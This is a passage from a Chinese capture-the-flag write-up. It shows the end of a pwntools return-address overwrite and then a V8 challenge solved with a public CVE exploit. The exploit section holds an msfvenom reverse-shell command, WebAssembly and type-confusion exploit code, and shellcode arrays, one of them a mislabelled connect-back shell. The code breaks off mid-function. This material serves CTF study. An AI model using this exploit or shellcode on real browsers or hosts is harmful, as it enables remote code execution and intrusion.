style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">e</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 24</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Flag: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Thank</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">backdoor </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">24</span><span style="color:#666666">:</span><span style="color:#4C9A91">27</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">choice: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 24</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">backdoor</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">choice: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="examination_station" class="scroll-target"><a href="#examination_station"><code class="hash inline-code">#</code>examination_station</a></h2>
<p>v8 pwn，出题人没有提供 patch 文件，说明是打 cve。</p>
<p>主要到版本号为 9.7.106.21，在搜索引擎上很容易找到 mailing list 里对应的 <a href="https://issues.chromium.org/issues/40061500" title="https://issues.chromium.org/issues/40061500" target="_blank" rel="noopener">cve</a></p>
<p>其中有 exp.js，拿来直接打就行，注意需要更换一下 shellcode。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> msfvenom</span><span style="color:#A65E2B"> -p</span><span style="color:#B56959"> linux/x64/shell_reverse_tcp</span><span style="color:#B56959"> LHOST=</span><span style="color:#2F798A">127.0.0.1</span><span style="color:#B56959"> LPORT=</span><span style="color:#2F798A">2333</span><span style="color:#A65E2B"> -f</span><span style="color:#B56959"> raw</span><span style="color:#AB5959"> |</span><span style="color:#59873A"> xxd</span><span style="color:#A65E2B"> -p</span><span style="color:#AB5959"> |</span><span style="color:#59873A"> sed</span><span style="color:#B5695977"> '</span><span style="color:#B56959">s/\(..\)/0x\1, /g</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> |</span><span style="color:#59873A"> fold</span><span style="color:#A65E2B"> --spaces</span><span style="color:#A65E2B"> --width</span><span style="color:#2F798A"> 50</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">$</span><span style="color:#C98A7D"> msfvenom</span><span style="color:#C99076"> -p</span><span style="color:#C98A7D"> linux/x64/shell_reverse_tcp</span><span style="color:#C98A7D"> LHOST=</span><span style="color:#4C9A91">127.0.0.1</span><span style="color:#C98A7D"> LPORT=</span><span style="color:#4C9A91">2333</span><span style="color:#C99076"> -f</span><span style="color:#C98A7D"> raw</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> xxd</span><span style="color:#C99076"> -p</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> sed</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">s/\(..\)/0x\1, /g</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> |</span><span style="color:#80A665"> fold</span><span style="color:#C99076"> --spaces</span><span style="color:#C99076"> --width</span><span style="color:#4C9A91"> 50</span><br></code></pre></div>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-javascript language-javascript"><span style="color:#AB5959">let</span><span style="color:#B07D48"> wasm_code</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Uint8Array</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 97</span><span style="color:#999999">,</span><span style="color:#2F798A"> 115</span><span style="color:#999999">,</span><span style="color:#2F798A"> 109</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 133</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 96</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 127</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 130</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#2F798A"> 132</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 112</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 5</span><span style="color:#999999">,</span><span style="color:#2F798A"> 131</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 6</span><span style="color:#999999">,</span><span style="color:#2F798A"> 129</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#999999">,</span><span style="color:#2F798A"> 145</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 6</span><span style="color:#999999">,</span><span style="color:#2F798A"> 109</span><span style="color:#999999">,</span><span style="color:#2F798A"> 101</span><span style="color:#999999">,</span><span style="color:#2F798A"> 109</span><span style="color:#999999">,</span><span style="color:#2F798A"> 111</span><span style="color:#999999">,</span><span style="color:#2F798A"> 114</span><span style="color:#999999">,</span><span style="color:#2F798A"> 121</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#2F798A"> 109</span><span style="color:#999999">,</span><span style="color:#2F798A"> 97</span><span style="color:#999999">,</span><span style="color:#2F798A"> 105</span><span style="color:#999999">,</span><span style="color:#2F798A"> 110</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#999999">,</span><span style="color:#2F798A"> 138</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 132</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 128</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 65</span><span style="color:#999999">,</span><span style="color:#2F798A"> 42</span><span style="color:#999999">,</span><span style="color:#2F798A"> 11</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> wasm_mod</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#2993a3">(</span><span style="color:#B07D48">wasm_code</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> wasm_instance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#2993a3">(</span><span style="color:#B07D48">wasm_mod</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> f</span><span style="color:#999999"> =</span><span style="color:#B07D48"> wasm_instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#B07D48">main</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">// shellcoode /bin/bash</span><br><span style="color:#A0ADA0">// const shellcode = new Uint8Array([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52,0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69,0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f,0x05]);</span><br><br><span style="color:#A0ADA0">// shellcode calculator</span><br><span style="color:#A0ADA0">// const shellcode = new Uint8Array([0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,</span><br><span style="color:#A0ADA0">// 	0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x0a, 0xa8,</span><br><span style="color:#A0ADA0">// 	0x01, 0x5e, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,</span><br><span style="color:#A0ADA0">// 	0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,</span><br><span style="color:#A0ADA0">// 	0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,</span><br><span style="color:#A0ADA0">// 	0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]);</span><br><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> shellcode</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Uint8Array</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0x48</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0xb8</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x2f</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x62</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x69</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x6e</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x2f</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x73</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x68</span><span style="color:#999999">,</span><br><span style="color:#2F798A">  0x00</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x99</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x50</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x54</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x5f</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x52</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x66</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x68</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x2d</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x63</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x54</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x5e</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x52</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0xe8</span><span style="color:#999999">,</span><br><span style="color:#2F798A">  0x0d</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x00</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x00</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x00</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x63</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x61</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x74</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x20</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x66</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x6c</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x61</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x67</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x2e</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x74</span><span style="color:#999999">,</span><br><span style="color:#2F798A">  0x78</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x74</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x00</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x56</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x57</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x54</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x5e</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x6a</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x3b</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x58</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x0f</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x05</span><span style="color:#999999">,</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> buf</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> ArrayBuffer</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> f64</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Float64Array</span><span style="color:#2993a3">(</span><span style="color:#B07D48">buf</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> u32</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Uint32Array</span><span style="color:#2993a3">(</span><span style="color:#B07D48">buf</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> bigUint64</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> BigUint64Array</span><span style="color:#2993a3">(</span><span style="color:#B07D48">buf</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">f2i</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">val</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    f64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> val</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> bigUint64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#59873A">i2f</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">val</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    bigUint64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> val</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> f64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#59873A">d2u</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">v</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    f64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> v</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> Array</span><span style="color:#999999">.</span><span style="color:#59873A">from</span><span style="color:#1e754f">(</span><span style="color:#B07D48">u32</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#59873A">u2d</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">lo</span><span style="color:#999999">,</span><span style="color:#B07D48"> hi</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    u32</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> lo</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    u32</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> hi</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> f64</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#59873A">ByteToBigIntArray</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">payload</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> sc</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> tmp</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> lenInt</span><span style="color:#999999"> =</span><span style="color:#59873A"> BigInt</span><span style="color:#1e754f">(</span><span style="color:#B07D48">Math</span><span style="color:#999999">.</span><span style="color:#59873A">floor</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">payload</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#AB5959"> /</span><span style="color:#2F798A"> 8</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#B07D48"> lenInt</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +=</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">n</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#B07D48">        tmp</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        for</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> j</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><span style="color:#B07D48"> j</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><span style="color:#B07D48"> j</span><span style="color:#AB5959">++</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">            tmp</span><span style="color:#AB5959"> +=</span><span style="color:#59873A"> BigInt</span><span style="color:#a13865">(</span><span style="color:#B07D48">payload</span><span style="color:#bda437">[</span><span style="color:#B07D48">i</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> +</span><span style="color:#B07D48"> j</span><span style="color:#bda437">]</span><span style="color:#a13865">)</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">0x1</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#2F798A">8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> *</span><span style="color:#B07D48"> j</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><br><span style="color:#B07D48">        sc</span><span style="color:#999999">.</span><span style="color:#59873A">push</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">tmp</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> len</span><span style="color:#999999"> =</span><span style="color:#B07D48"> payload</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#AB5959"> %</span><span style="color:#2F798A"> 8</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    tmp</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#B07D48"> len</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959">++</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#B07D48">        tmp</span><span style="color:#AB5959"> +=</span><span style="color:#59873A"> BigInt</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">payload</span><span style="color:#a13865">[</span><span style="color:#B07D48">lenInt</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> +</span><span style="color:#B07D48"> i</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> *</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A">0x1</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> *</span><span style="color:#B07D48"> i</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#B07D48">    sc</span><span style="color:#999999">.</span><span style="color:#59873A">push</span><span style="color:#1e754f">(</span><span style="color:#B07D48">tmp</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> sc</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#AB5959">function</span><span style="color:#59873A"> trigger</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> v1</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    function</span><span style="color:#59873A"> f0</span><span style="color:#1e754f">(</span><span style="color:#B07D48">v4</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        v4</span><span style="color:#a65e2b">(</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#a13865">{</span><span style="color:#999999"> </span><span style="color:#a13865">}</span><span style="color:#999999">,</span><span style="color:#B07D48"> v5</span><span style="color:#999999"> =</span><span 